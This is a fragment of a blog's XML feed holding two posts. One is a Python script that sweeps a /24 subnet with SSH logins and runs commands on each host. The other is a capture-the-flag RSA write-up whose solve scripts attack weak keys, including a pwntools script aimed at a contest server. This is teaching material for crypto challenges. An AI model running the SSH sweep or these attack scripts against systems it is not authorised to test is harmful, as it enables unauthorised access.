          
      </categories>
      
      
        <tags>
            
            <tag> static </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ssh pi by python</title>
      <link href="/2018/06/08/ssh-pi-by-python/"/>
      <url>/2018/06/08/ssh-pi-by-python/</url>
      
        <content type="html"><![CDATA[<p>use python to scan raspberry pi</p><span id="more"></span><pre><code class="python">#-*- coding: utf-8 -*-#!/usr/bin/pythonimport paramikoimport threadingdef ssh2(ip,username,passwd,cmd):    try:        ssh = paramiko.SSHClient()        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())        ssh.connect(ip,22,username,passwd,timeout=5)        for m in cmd:            stdin, stdout, stderr = ssh.exec_command(m)#           stdin.write(&quot;Y&quot;)   #简单交互，输入 ‘Y’            out = stdout.readlines()            #屏幕输出            for o in out:                print o,        print &#39;%s\tOK\n&#39;%(ip)        ssh.close()    except :        pass        #print &#39;%s\tError\n&#39;%(ip)if __name__==&#39;__main__&#39;:    cmd = [&#39;echo hello!&#39;]#你要执行的命令列表    username = &quot;&quot;  #用户名    passwd = &quot;&quot;    #密码    threads = []   #多线程    print &quot;Begin......&quot;    for i in range(1,254):        ip = &#39;10.43.11.&#39;+str(i)        a=threading.Thread(target=ssh2,args=(ip,username,passwd,cmd))        a.start()</code></pre>]]></content>
      
      
      <categories>
          
          <category> trick </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Raspberrypi </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>rsa-of-ctf-2</title>
      <link href="/2018/06/03/rsa-of-ctf-2/"/>
      <url>/2018/06/03/rsa-of-ctf-2/</url>
      
        <content type="html"><![CDATA[<h1 id="8-gcd-n1-n2"><a href="#8-gcd-n1-n2" class="headerlink" title="8.gcd(n1,n2)"></a>8.gcd(n1,n2)</h1><p>Sometimes,n1 n2 are too big to factor.you can try gcd(n1,n2)</p><span id="more"></span><pre><code class="python">def gcd(a, b):    if a &lt; b:        a, b = b, a    while b != 0:        temp = a % b        a = b        b = temp    return adef computeD(fn, e):    (x, y, r) = extendedGCD(fn, e)    #y maybe &lt; 0, so convert it    if y &lt; 0:        return fn + y    return ydef extendedGCD(a, b):    #a*xi + b*yi = ri    if b == 0:        return (1, 0, a)    #a*x1 + b*y1 = a    x1 = 1    y1 = 0    #a*x2 + b*y2 = b    x2 = 0    y2 = 1    while b != 0:        q = a / b        #ri = r(i-2) % r(i-1)        r = a % b        a = b        b = r        #xi = x(i-2) - q*x(i-1)        x = x1 - q*x2        x1 = x2        x2 = x        #yi = y(i-2) - q*y(i-1)        y = y1 - q*y2        y1 = y2        y2 = y    return(x1, y1, a)n1 = 28989197955870674811941817152881961892555962828020048566215146047714999804743571465320756664500939106612607504133407755470924915037883788416084924998195415611009578161228226056524027626453567996030151847302248848345942762209886902216532270655286303624781479379460319335849225128417295447574269158603952744753408534894136230960676590980945838733350143370605144754932401806068003166087495356366335014736018745371974324955357717635855207674309628146381030418983172039685916675081977078212813718313201568394044637347955108623458947913411108888733982376607647705302281273170230540579872437433435253235534772724624778056181n2 = 29703811006265969568420235185761287243393105045336995893094671661145408859269297497044834735198371987472186770953203812235003929122122129964989222762478116003185582578013431109127657242169359697936471497781547555222392181694624446976869099519331688628488881595076878345856808384797954271081176432330698334469596003760530797898645529616535584139559768170011693043197581376652770244664582733792825511473683193195672487559140733668442863818306947800631472845430628311685792799840854080385208783178691512540436222290062939858472754953657763052720510548438848633979413756332920634307585878271699119574149435107725143578613c1=14200655400630956617529154837540349350095534430543196299987252783320359338882400858000649938298574946882176873795065987640380185922571487987903069796872680567596754211592988768630729844485795253975027297563832927176988502771266530781452168489731952873297707254669904609865565861351429459102567318447934677565870915603816516557032164955329497823771897899211076176905132170360842951444390670253036307048815943908305457043184642918674003085039564350070641592716116089015861491205237748561298604957423077954850396167621218521884114394431799317165818964438359695744604198246716410783223931430682808151056020475306791729591e=0x10001p = gcd(n1,n2)q=n1/pfn=(p - 1) * (q - 1)d = computeD(fn, e)m=pow(c1,d,n1)print(hex(m)[2:-1].decode(&#39;hex&#39;))</code></pre><h1 id="9-rsa-combinations"><a href="#9-rsa-combinations" class="headerlink" title="9.rsa_combinations"></a>9.rsa_combinations</h1><p>deforce rsa………!!!!</p><pre><code class="python">#! /usr/bin/python2.7from Crypto.Util.number import size,bytes_to_long,getStrongPrimefrom itertools import combinationsmsg = bytes_to_long(&quot;Your secret flag is : flag&#123;**************************&#125;&quot;)e = 65537pri = []f = open(&#39;cipherx.txt&#39;, &#39;w&#39;)for i in range(5):    pri.append(getStrongPrime(1024,65537))print(&#39;pri&#39;,pri)for k in combinations(pri, 2):    n = k[0] * k[1]    print k[0],k[1]    f.write(str(pow(msg, e, n)) + &#39;\n&#39;)</code></pre><p>solve.py</p><pre><code class="python">#! usr/bin/python2.7#coding=utf-8import binasciiimport gmpy2def gcd(a, b):    if a &lt; b:        a, b = b, a    while b != 0:        temp = a % b        a = b        b = temp    return adef egcd(a, b):    if a == 0:        return (b, 0, 1)    else:        g, y, x = egcd(b % a, a)        return (g, x - (b // a) * y, y)def modinv(a, m):    g, x, y = egcd(a, m)    if g != 1:        raise Exception(&#39;modular inverse does not exist&#39;)    else:        return x % mc2 = 1246234818568605038771725387770032809896657624658751197487822667705150496788266236821445252745402061440344837126297118817722352360943422714353348519968257483217425318287123603122559539044278216514618542935008251728016376351207287908907419066172027356649934716661853550169371283110451199593919378518682893908073257597996213276417788967527409800490507319098619694553882580772197585922179030322385772341029003564359719244782484762058530989277184051441547024568631595655539528137422918541855814336215841836541683256179952847812650782272979437883178787135567291812430132598562391722110607279005808604132547633446702754242c1 = 13455981172983326464102311937762831661788310626361076786164994487793945326981111197066703467784063584677545316464486222690177319997065759168374653040496712059568682406584202721616582863702654975066950060466986422582257001703187853927809075825528343329091775200012208860563692058684819775698290978617780577594014210672865880497874392738697086445744342656347507587613428993075257255547029724259635931665971785614738909042286207279739603543188892504358133043289264464915763121424437513688474543252743250750837754962444189265768058493217120380229238478428390747580847275659398491959011425398794606200760449574140326761335c3 = 4888187708328317620094507614800274226981107085929590254185425273559042976171503907943793194842845890835133406885671925681517347731439124039971268535772441389943526257018243714512592593512323296725941627631582840937936230289732464068819395084847503736153991018426601148001171410680610396315398455868476519242523364370643315263903656899707643857165005292144961418736390628879183534554050946402008748537061851428674751948379857099827888766867529291843558247067650218013841320566949128247840292451599528568785840031947044173916230774125850838571273228740235067857273673072775479606479505558411747622879981674961795496398c4 = 5945807707085423616106397090464145288661224101014907693104654596081518092031824289580553655597136400293583390581989219838293858796303129177903562794487009660324129992480484791256849653177916440709763357317237732026978876936371843211238777064330897077782446698577278202922221650609784909136488983753316374328060041688862833502261386605214386656750469198595184961624056503168436674528338454488445689162595307651649338939926811181397583426347049799471037024928424365956074689363634987714880064366326557578148205795406310315807810873199906864220949509516643869325208494504730147145059516579980994124490343208766447536810c5 = 6187445948828077692015970911804646938282242052772994916845077569070730070453969382819385152870562813549652542234501650247554999118997287612656768657169917874500360552882579507148077964788035519927189184337650311696041346297615679489279371787315665879866086591715868260088943256008041145891355773432381271043597673424658569516927545882320343535771872720945022165744462740208023473214182506701311573606230422976998106293803156552098142853857635121713770388765373265153557740921629496699557717987765469270646934300913295007513219413849883613183601728166411181113787689840581266359785250985019212532583960800460788015491c6 = 5212091418073782411520553214182135709421767268933861097557470068670598830761237108296366132955527825989098372862689616150847719971020880914262684813844505249039731390296288313064277036616294317850242554242344468349017823603991546642546139312359635120516022621977198868713265236780584328968456455227210401242292651898111573896055644196069499504205254423973191477361052269017513569237003435455766967610384127786317357129201800175882818678442257638418605140567086462026872695510406713566416179338847089594383139719544078973639147656333759205784973323451162915648440751084782358602950098354039646328692181357908591122714c7 = 3655638351649160392053613377223998746456935081525685917833104279800461813163792301601632928836306436302774882558931553763046873854372645433876037722220899647761264466458772539363592772806366025160060082392022496959043608616479633871824843539139765269866557324139669669180299880464960812373747543711884223811204173243558307161330834607275612285093379360358536623915157494256701984991891771698584900549732277659667805289723868414345078895913383480318010760628083474820289670382156241646315278789987701943251698483519785588242374214684684812447667402223553085547756490931266818022366894997520489636576763520143455761239c8 = 22473849661397275053996298243554884261414191820929237708168650853330395912319504073426952208513086627198829384154042315234052506082911684608144173835091410795393615116386997884885069683405033389454289189585622646957977150864405507253019700368456175153569120706431504842630017193823414614613515543944012768438615372135192092455771020625920899643657460748140525123446385745452885018242994907719060418829076821951353655094288932417789785658686354925401717179930381179237133075628900875416109603229568575866141143927588631408100548721530988132959911381450682687082674104687988294384311340599275049224252503713916928373410c9 = 1873513506226622659558980965960349556051601818636390593699111238742079235436048735742501009666517921834732172263333584189891447981830661750295791445758897570358691214228971207469306988655891013882209331385427955502522192570359268476079812111160032458293920218131883616683323041237563743943563895577660520218905767619038915659113775800791354119111094458073436219216055603238833113774387249183198627105364934918297190119325269494891789384314242315970885073496066247057106399028140269736234473860608631980241965505615924442715413658175017031374265609800935996459163053296259788980765102199701839555511572730799034774424c10= 20415066745705913332960559851272168836161858864856687615100156867932858500059203383582659999680270947712850092591947365553338831150848535525568756863490320019679102804007709747313186252161566229585999657772047185972884107522202907260488147758131548047735509416576778951156037782507571965765760567109821746219259712533369530160331404056822935924868818144471996283443950605787104623265573763097577017088633658357190202370173046308936352735690024216178434559387107878752418634566838258964132836294305792991271935081972613859675575909742688564959474926073661839487937083301362266785004789397144843903897244356681794196480p = gmpy2.gcd((c1-c2),(c3-c2))q = gmpy2.gcd((c6-c9),(c7-c9))c = c1n = p*qd = modinv(65537,(p-1)*(q-1))m = hex(pow(c,d,n))flag = m[2:]print(binascii.unhexlify(flag))</code></pre><h1 id="10-rsa-blast"><a href="#10-rsa-blast" class="headerlink" title="10.rsa blast"></a>10.rsa blast</h1><p>generally with other encryption algorithm,and can blast by bits.<br>question.py</p><pre><code class="python"># import signaln = 0xBACA954B2835186EEE1DAC2EF38D7E11582127FB9E6107CCAFE854AE311C07ACDE3AAC8F0226E1435D53F03DC9CE6701CF9407C77CA9EE8B5C0DEE300B11DD4D6DC33AC50CA9628A7FB3928943F90738BF6F5EC39F786D1E6AD565EB6E0F1F92ED3227658FDC7C3AE0D4017941E1D5B27DB0F12AE1B54664FD820736235DA626F0D6F97859E5969902088538CF70A0E8B833CE1896AE91FB62852422B8C29941903A6CF4A70DF2ACA1D5161E01CECFE3AD80041B2EE0ACEAA69C793D6DCCC408519A8C718148CF897ACB24FADD8485588B50F39BCC0BBF2BF7AD56A51CB3963F1EB83D2159E715C773A1CB5ACC05B95D2253EEFC3CCC1083A5EF279AF06BB92Fe = 0x10001def pad(s):    s += (256 - len(s)) * chr(256 - len(s))    ret = [&#39;\x00&#39; for _ in range(256)]    for index, pos in enumerate(s_box):        ret[pos] = s[index]    return &#39;&#39;.join(ret)def unpad(s):    ret = [&#39;\x00&#39; for _ in range(256)]    for index, pos in enumerate(invs_box):        ret[pos] = s[index]    return &#39;&#39;.join(ret[0:-ord(ret[-1])])def str2int(s):    return int(s.encode(&#39;hex&#39;), 16)s_box = [    0x63, 0x7C, 0x77, 0x7B, 0xF2, 0x6B, 0x6F, 0xC5, 0x30, 0x01, 0x67, 0x2B, 0xFE, 0xD7, 0xAB, 0x76,    0xCA, 0x82, 0xC9, 0x7D, 0xFA, 0x59, 0x47, 0xF0, 0xAD, 0xD4, 0xA2, 0xAF, 0x9C, 0xA4, 0x72, 0xC0,    0xB7, 0xFD, 0x93, 0x26, 0x36, 0x3F, 0xF7, 0xCC, 0x34, 0xA5, 0xE5, 0xF1, 0x71, 0xD8, 0x31, 0x15,    0x04, 0xC7, 0x23, 0xC3, 0x18, 0x96, 0x05, 0x9A, 0x07, 0x12, 0x80, 0xE2, 0xEB, 0x27, 0xB2, 0x75,    0x09, 0x83, 0x2C, 0x1A, 0x1B, 0x6E, 0x5A, 0xA0, 0x52, 0x3B, 0xD6, 0xB3, 0x29, 0xE3, 0x2F, 0x84,    0x53, 0xD1, 0x00, 0xED, 0x20, 0xFC, 0xB1, 0x5B, 0x6A, 0xCB, 0xBE, 0x39, 0x4A, 0x4C, 0x58, 0xCF,    0xD0, 0xEF, 0xAA, 0xFB, 0x43, 0x4D, 0x33, 0x85, 0x45, 0xF9, 0x02, 0x7F, 0x50, 0x3C, 0x9F, 0xA8,    0x51, 0xA3, 0x40, 0x8F, 0x92, 0x9D, 0x38, 0xF5, 0xBC, 0xB6, 0xDA, 0x21, 0x10, 0xFF, 0xF3, 0xD2,    0xCD, 0x0C, 0x13, 0xEC, 0x5F, 0x97, 0x44, 0x17, 0xC4, 0xA7, 0x7E, 0x3D, 0x64, 0x5D, 0x19, 0x73,    0x60, 0x81, 0x4F, 0xDC, 0x22, 0x2A, 0x90, 0x88, 0x46, 0xEE, 0xB8, 0x14, 0xDE, 0x5E, 0x0B, 0xDB,    0xE0, 0x32, 0x3A, 0x0A, 0x49, 0x06, 0x24, 0x5C, 0xC2, 0xD3, 0xAC, 0x62, 0x91, 0x95, 0xE4, 0x79,    0xE7, 0xC8, 0x37, 0x6D, 0x8D, 0xD5, 0x4E, 0xA9, 0x6C, 0x56, 0xF4, 0xEA, 0x65, 0x7A, 0xAE, 0x08,    0xBA, 0x78, 0x25, 0x2E, 0x1C, 0xA6, 0xB4, 0xC6, 0xE8, 0xDD, 0x74, 0x1F, 0x4B, 0xBD, 0x8B, 0x8A,    0x70, 0x3E, 0xB5, 0x66, 0x48, 0x03, 0xF6, 0x0E, 0x61, 0x35, 0x57, 0xB9, 0x86, 0xC1, 0x1D, 0x9E,    0xE1, 0xF8, 0x98, 0x11, 0x69, 0xD9, 0x8E, 0x94, 0x9B, 0x1E, 0x87, 0xE9, 0xCE, 0x55, 0x28, 0xDF,    0x8C, 0xA1, 0x89, 0x0D, 0xBF, 0xE6, 0x42, 0x68, 0x41, 0x99, 0x2D, 0x0F, 0xB0, 0x54, 0xBB, 0x16]invs_box = [    0x52, 0x09, 0x6A, 0xD5, 0x30, 0x36, 0xA5, 0x38, 0xBF, 0x40, 0xA3, 0x9E, 0x81, 0xF3, 0xD7, 0xFB,    0x7C, 0xE3, 0x39, 0x82, 0x9B, 0x2F, 0xFF, 0x87, 0x34, 0x8E, 0x43, 0x44, 0xC4, 0xDE, 0xE9, 0xCB,    0x54, 0x7B, 0x94, 0x32, 0xA6, 0xC2, 0x23, 0x3D, 0xEE, 0x4C, 0x95, 0x0B, 0x42, 0xFA, 0xC3, 0x4E,    0x08, 0x2E, 0xA1, 0x66, 0x28, 0xD9, 0x24, 0xB2, 0x76, 0x5B, 0xA2, 0x49, 0x6D, 0x8B, 0xD1, 0x25,    0x72, 0xF8, 0xF6, 0x64, 0x86, 0x68, 0x98, 0x16, 0xD4, 0xA4, 0x5C, 0xCC, 0x5D, 0x65, 0xB6, 0x92,    0x6C, 0x70, 0x48, 0x50, 0xFD, 0xED, 0xB9, 0xDA, 0x5E, 0x15, 0x46, 0x57, 0xA7, 0x8D, 0x9D, 0x84,    0x90, 0xD8, 0xAB, 0x00, 0x8C, 0xBC, 0xD3, 0x0A, 0xF7, 0xE4, 0x58, 0x05, 0xB8, 0xB3, 0x45, 0x06,    0xD0, 0x2C, 0x1E, 0x8F, 0xCA, 0x3F, 0x0F, 0x02, 0xC1, 0xAF, 0xBD, 0x03, 0x01, 0x13, 0x8A, 0x6B,    0x3A, 0x91, 0x11, 0x41, 0x4F, 0x67, 0xDC, 0xEA, 0x97, 0xF2, 0xCF, 0xCE, 0xF0, 0xB4, 0xE6, 0x73,    0x96, 0xAC, 0x74, 0x22, 0xE7, 0xAD, 0x35, 0x85, 0xE2, 0xF9, 0x37, 0xE8, 0x1C, 0x75, 0xDF, 0x6E,    0x47, 0xF1, 0x1A, 0x71, 0x1D, 0x29, 0xC5, 0x89, 0x6F, 0xB7, 0x62, 0x0E, 0xAA, 0x18, 0xBE, 0x1B,    0xFC, 0x56, 0x3E, 0x4B, 0xC6, 0xD2, 0x79, 0x20, 0x9A, 0xDB, 0xC0, 0xFE, 0x78, 0xCD, 0x5A, 0xF4,    0x1F, 0xDD, 0xA8, 0x33, 0x88, 0x07, 0xC7, 0x31, 0xB1, 0x12, 0x10, 0x59, 0x27, 0x80, 0xEC, 0x5F,    0x60, 0x51, 0x7F, 0xA9, 0x19, 0xB5, 0x4A, 0x0D, 0x2D, 0xE5, 0x7A, 0x9F, 0x93, 0xC9, 0x9C, 0xEF,    0xA0, 0xE0, 0x3B, 0x4D, 0xAE, 0x2A, 0xF5, 0xB0, 0xC8, 0xEB, 0xBB, 0x3C, 0x83, 0x53, 0x99, 0x61,    0x17, 0x2B, 0x04, 0x7E, 0xBA, 0x77, 0xD6, 0x26, 0xE1, 0x69, 0x14, 0x63, 0x55, 0x21, 0x0C, 0x7D]def mul(x, y, z):    ret = 1    while y != 0:        if y &amp; 1 != 0:            ret = (ret * x) % z        x = (x * x) % z        y &gt;&gt;= 1    return retdef welcom():    # signal.alarm(5)    print r&quot;&quot;&quot; ____  ____    _      ______   ______ _____ _____ __  __ |  _ \/ ___|  / \    / ___\ \ / / ___|_   _| ____|  \/  || |_) \___ \ / _ \   \___ \\ V /\___ \ | | |  _| | |\/| ||  _ &lt; ___) / ___ \   ___) || |  ___) || | | |___| |  | ||_| \_\____/_/   \_\ |____/ |_| |____/ |_| |_____|_|  |_|&quot;&quot;&quot;def main():    welcom()    flag = open(&#39;./flag&#39;, &#39;r&#39;).read()    flag_len = len(flag)    assert(flag_len == 38)    flag = pad(flag)    while True:        print &#39;&#39;&#39;1. sign flag2. get signed flagPlease give me your choice :&#39;&#39;&#39;        cmd = raw_input()        if cmd == &#39;1&#39;:            assert(len(flag) == 256)            flag = unpad(flag)[:flag_len] + raw_input(&#39;Please sign your flag (0 - %d): &#39; % (256 - flag_len))            assert(len(flag) &lt;= 256)            flag = pad(flag)            print &#39;Success&#39;        elif cmd == &#39;2&#39;:            signature = mul(str2int(flag), e, n)            print &#39;Your signed flag ciphertext is : 0x%x&#39; % signature        else:            print &#39;Bye bye&#39;            exit(0)if __name__ == &#39;__main__&#39;:    main()</code></pre><p>solve.py</p><pre><code class="python">#encoding=utf-8from pwn import *from time import sleep# context.log_level=&#39;debug&#39;ip=&#39;123.59.138.211&#39;# ip=&#39;127.0.0.1&#39;ppp=[99, 124, 119, 123, 242, 107, 111, 197, 48, 1, 103, 43, 254, 215, 171, 118, 202, 130, 201, 125, 250, 89, 71, 240, 173, 212, 162, 175, 156, 164, 114, 192, 183, 253, 147, 38, 54, 63]n = 0xBACA954B2835186EEE1DAC2EF38D7E11582127FB9E6107CCAFE854AE311C07ACDE3AAC8F0226E1435D53F03DC9CE6701CF9407C77CA9EE8B5C0DEE300B11DD4D6DC33AC50CA9628A7FB3928943F90738BF6F5EC39F786D1E6AD565EB6E0F1F92ED3227658FDC7C3AE0D4017941E1D5B27DB0F12AE1B54664FD820736235DA626F0D6F97859E5969902088538CF70A0E8B833CE1896AE91FB62852422B8C29941903A6CF4A70DF2ACA1D5161E01CECFE3AD80041B2EE0ACEAA69C793D6DCCC408519A8C718148CF897ACB24FADD8485588B50F39BCC0BBF2BF7AD56A51CB3963F1EB83D2159E715C773A1CB5ACC05B95D2253EEFC3CCC1083A5EF279AF06BB92Fe = 0x10001def str2int(s):    return int(s.encode(&#39;hex&#39;), 16)def s1(fff):    p.recvuntil(&#39;choice :\n&#39;)    p.sendline(&#39;1&#39;)    p.recvuntil(&#39;):&#39;)    p.sendline(fff) def s2():    p.recvuntil(&#39;choice :\n&#39;)    p.sendline(&#39;2&#39;)    p.recvuntil(&#39;is : &#39;)    t=p.recvline()    # print(&#39;t&#39;,t.replace(&#39;\n&#39;,&#39;&#39;))    return tflag=&quot;f&quot;    for i in range(2,39):    p=remote(ip, 23333)    # p.interactive()    s1(chr(256-i)*218)    s1(&#39;&#39;)    c=s2()    m=[chr(256-i) for tm in range(256)]    for l in range(len(flag)):        m[ppp[l]]=flag[l]    for jj in range(0,256):        m[ppp[i-1]]=chr(jj)        kkk=&quot;&quot;        for mm in m:            kkk+=mm        kkk=str2int(kkk)        if(pow(kkk,e,n)==int(c,16)):            flag+=chr(jj)            print(flag)            break    p.close()</code></pre><ol start="11"><li>haved knowed high bits of Plaintext<br>with e&#x3D;3,you can use Coppersmith theorem to find it with a log(n) algorithm.<br>you should use it in sage.(in sage cloud is ok)</li></ol><pre><code class="python">import timedebug = True# display matrix picture with 0 and Xdef matrix_overview(BB, bound):    for ii in range(BB.dimensions()[0]):        a = (&#39;%02d &#39; % ii)        for jj in range(BB.dimensions()[1]):            a += &#39;0&#39; if BB[ii,jj] == 0 else &#39;X&#39;            a += &#39; &#39;        if BB[ii, ii] &gt;= bound:            a += &#39;~&#39;        print adef coppersmith_howgrave_univariate(pol, modulus, beta, mm, tt, XX):    &quot;&quot;&quot;    Coppersmith revisited by Howgrave-Graham    finds a solution if:    * b|modulus, b &gt;= modulus^beta , 0 &lt; beta &lt;= 1    * |x| &lt; XX    &quot;&quot;&quot;    #    # init    #    dd = pol.degree()    nn = dd * mm + tt    #    # checks    #    if not 0 &lt; beta &lt;= 1:        raise ValueError(&quot;beta should belongs in (0, 1]&quot;)    if not pol.is_monic():        raise ArithmeticError(&quot;Polynomial must be monic.&quot;)    #    # calculate bounds and display them    #    &quot;&quot;&quot;    * we want to find g(x) such that ||g(xX)|| &lt;= b^m / sqrt(n)    * we know LLL will give us a short vector v such that:    ||v|| &lt;= 2^((n - 1)/4) * det(L)^(1/n)    * we will use that vector as a coefficient vector for our g(x)    * so we want to satisfy:    2^((n - 1)/4) * det(L)^(1/n) &lt; N^(beta*m) / sqrt(n)    so we can obtain ||v|| &lt; N^(beta*m) / sqrt(n) &lt;= b^m / sqrt(n)    (it&#39;s important to use N because we might not know b)    &quot;&quot;&quot;    if debug:        # t optimized?        print &quot;\n# Optimized t?\n&quot;        print &quot;we want X^(n-1) &lt; N^(beta*m) so that each vector is helpful&quot;        cond1 = RR(XX^(nn-1))        print &quot;* X^(n-1) = &quot;, cond1        cond2 = pow(modulus, beta*mm)        print &quot;* N^(beta*m) = &quot;, cond2        print &quot;* X^(n-1) &lt; N^(beta*m) \n-&gt; GOOD&quot; if cond1 &lt; cond2 else &quot;* X^(n-1) &gt;= N^(beta*m) \n-&gt; NOT GOOD&quot;        # bound for X        print &quot;\n# X bound respected?\n&quot;        print &quot;we want X &lt;= N^(((2*beta*m)/(n-1)) - ((delta*m*(m+1))/(n*(n-1)))) / 2 = M&quot;        print &quot;* X =&quot;, XX        cond2 = RR(modulus^(((2*beta*mm)/(nn-1)) - ((dd*mm*(mm+1))/(nn*(nn-1)))) / 2)        print &quot;* M =&quot;, cond2        print &quot;* X &lt;= M \n-&gt; GOOD&quot; if XX &lt;= cond2 else &quot;* X &gt; M \n-&gt; NOT GOOD&quot;        # solution possible?        print &quot;\n# Solutions possible?\n&quot;        detL = RR(modulus^(dd * mm * (mm + 1) / 2) * XX^(nn * (nn - 1) / 2))        print &quot;we can find a solution if 2^((n - 1)/4) * det(L)^(1/n) &lt; N^(beta*m) / sqrt(n)&quot;        cond1 = RR(2^((nn - 1)/4) * detL^(1/nn))        print &quot;* 2^((n - 1)/4) * det(L)^(1/n) = &quot;, cond1        cond2 = RR(modulus^(beta*mm) / sqrt(nn))        print &quot;* N^(beta*m) / sqrt(n) = &quot;, cond2        print &quot;* 2^((n - 1)/4) * det(L)^(1/n) &lt; N^(beta*m) / sqrt(n) \n-&gt; SOLUTION WILL BE FOUND&quot; if cond1 &lt; cond2 else &quot;* 2^((n - 1)/4) * det(L)^(1/n) &gt;= N^(beta*m) / sqroot(n) \n-&gt; NO SOLUTIONS MIGHT BE FOUND (but we never know)&quot;        # warning about X        print &quot;\n# Note that no solutions will be found _for sure_ if you don&#39;t respect:\n* |root| &lt; X \n* b &gt;= modulus^beta\n&quot;    #    # Coppersmith revisited algo for univariate    #    # change ring of pol and x    polZ = pol.change_ring(ZZ)    x = polZ.parent().gen()    # compute polynomials    gg = []    for ii in range(mm):        for jj in range(dd):            gg.append((x * XX)**jj * modulus**(mm - ii) * polZ(x * XX)**ii)    for ii in range(tt):        gg.append((x * XX)**ii * polZ(x * XX)**mm)    # construct lattice B    BB = Matrix(ZZ, nn)    for ii in range(nn):        for jj in range(ii+1):            BB[ii, jj] = gg[ii][jj]    # display basis matrix    if debug:        matrix_overview(BB, modulus^mm)    # LLL    BB = BB.LLL()    # transform shortest vector in polynomial    new_pol = 0    for ii in range(nn):        new_pol += x**ii * BB[0, ii] / XX**ii    # factor polynomial    potential_roots = new_pol.roots()    print &quot;potential roots:&quot;, potential_roots    # test roots    roots = []    for root in potential_roots:        if root[0].is_integer():            result = polZ(ZZ(root[0]))            if gcd(modulus, result) &gt;= modulus^beta:                roots.append(ZZ(root[0]))    #    return roots############################################# Test on Stereotyped Messages##########################################print &quot;//////////////////////////////////&quot;print &quot;// TEST 1&quot;print &quot;////////////////////////////////&quot;# RSA gen options (for the demo)length_N = 1024  # size of the modulusKbits = 512      # size of the roote = 3# RSA gen (for the demo)N=0x79982a272b9f50b2c2bc8b862ccc617bb39720a6dc1a22dc909bbfd1243cc0a03dd406ec0b1a78fa75ce5234e8c57e0aab492050906364353b06ccd45f90b7818b04be4734eeb8e859ef92a306be105d32108a3165f96664ac1e00bba770f04627da05c3d7513f5882b2807746090cebbf74cd50c0128559a2cc9fa7d88f7b2dZmodN = Zmod(N);# Create problem (for the demo)K = ZZ.random_element(0, 2^Kbits)Kdigits = K.digits(2)M = [0]*Kbits + [1]*(length_N-Kbits);for i in range(len(Kdigits)):    M[i] = Kdigits[i]M = ZZ(M, 2)C=0x381db081852c92d268b49a1b9486d724e4ecf49fc97dc5f20d1fad902b5cdfb49c8cc1e968e36f65ae9af7e8186f15ccdca798786669a3d2c9fe8767a7ae938a4f9115ae8fed4928d95ad550fddd3a9c1497785c9e2279edf43f04601980aa28b3b52afb55e2b34e5b175af25d5b3bd71db88b3b31e48a177a469116d957592cb=0xfedcba98765432100000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000# Problem to equation (default)P.&lt;x&gt; = PolynomialRing(ZmodN) #, implementation=&#39;NTL&#39;)pol = (b + x)^e - Cdd = pol.degree()# Tweak thosebeta = 1                                # b = Nepsilon = beta / 7                      # &lt;= beta / 7mm = ceil(beta**2 / (dd * epsilon))     # optimized valuett = floor(dd * mm * ((1/beta) - 1))    # optimized valueXX = ceil(N**((beta**2/dd) - epsilon))  # optimized value# Coppersmithstart_time = time.time()roots = coppersmith_howgrave_univariate(pol, N, beta, mm, tt, XX)# outputprint &quot;\n# Solutions&quot;print &quot;we want to find:&quot;,str(K)print &quot;we found:&quot;, str(roots)print(&quot;in: %s seconds &quot; % (time.time() - start_time))print &quot;\n&quot;</code></pre><h1 id="12-wiener-attack"><a href="#12-wiener-attack" class="headerlink" title="12.wiener attack"></a>12.wiener attack</h1><p>if e looks very big.the d may very small.<br>wiener is best to deal it.<br><a href="https://github.com/pablocelayes/rsa-wiener-attack">wiener attack</a></p><h1 id="13-Boneh-Durfee-Method"><a href="#13-Boneh-Durfee-Method" class="headerlink" title="13.Boneh Durfee Method"></a>13.Boneh Durfee Method</h1><p>if $ d \leq { N ^ 0.292 } $<br>waiting …..</p><h1 id="14-choose-cipher-attack"><a href="#14-choose-cipher-attack" class="headerlink" title="14.choose cipher attack"></a>14.choose cipher attack</h1><p>alice : m,n,e,c<br>bob : p,q,d,e</p><p>alice give c to bob<br>but we attack it.<br>we choose a and a need gcd(a,n)&#x3D;&#x3D;1.<br>computer y&#x3D;(c * pow(a,e,n))%n</p><pre><code class="python">import gmpy2e=3d=76049878755826336166698139456670360823402717889604969895349508344800412770121957624523975279069318035733764051730593939133424845912466592703373981870874751299015095128705553078747239081130209768910810258649166320353848933996042110730355149970574587323408350943779715053374237240149786382572122316303550059037311599492982439109580656235437909296003096272288705370676044110102935615857801394460044326948435774452489727128000706767789005786209476060332099626876494991496861201654482133245707868426039793944745637143823027996364278711920669753886683794052292533067458821708034433961163807255826762446204313797046780518947N=114074818133739504250047209185005541235104076834407454843024262517200619155182936436785962918603977053600646077595890908700137268868699889055060972806312126948522642693058329618120858621695314653366215387973749480530773400994063166095532724955861880985112526415669572580061355860224679573858183474455325088556643994673345465994162610420723170253345262031304174343327749668957998269532265104735742501097132399909676529715137398930849255495327761212026819673358330120772259339210848101393790624794141497382162858696771273350710124735773784422786465775396114824753700050260926501450377050949467981761553058188615697572753r=234523452M=int(&#39;flag&#123;test_for_cca&#125;&#39;.encode(&#39;hex&#39;),16)cipher=pow(M,e,N)print &#39;Initial cipher:\t&#39;,ciphercipher_dash = (cipher * pow(r,e,N)) % Nprint &#39;Eve gets Bob to decipher:\t&#39;,cipher_dash# cipher_dash=90511031607784830273878497072346123546679455256898204196402641372333492940234358009499271727755472553207867386254653658733724900948880219984215792979665435989733167788337042506336114726850208031943574244260983595450232099102339183752672009132355515013239721171582732831124336428650165790015071038470233163029309771817779975903409021754911379543318740006147263912863780000070643964489448504069333128038084002549074569589992574916389850594000510506164205174491002424884037866223779862414707858447048555823073520047145522373211382098608293593800755101294502576108329124664271831858488981525137002348725042733161552081766decipher = pow(cipher_dash,d,N)print &#39;Bob says that the result is wrong:&#39;,decipherprint &#39;Eve determines as:&#39;,hex(decipher/r)[2:-1].decode(&#39;hex&#39;)</code></pre><h1 id="15-e-is-not-prime-number"><a href="#15-e-is-not-prime-number" class="headerlink" title="15.e is not prime number"></a>15.e is not prime number</h1><p>if e is not prime number.use next two scripts.</p><p>solve1.py</p><pre><code class="python">#-*- coding:utf-8 -*-from Crypto.Util.number import *import sympydef gcd(a,b): if a &lt; b:    a,b = b,a while b != 0:     tem = a % b     a = b     b = tem return adef invalidExponent(p,q,e,c): phiN = (p - 1) * (q - 1) n 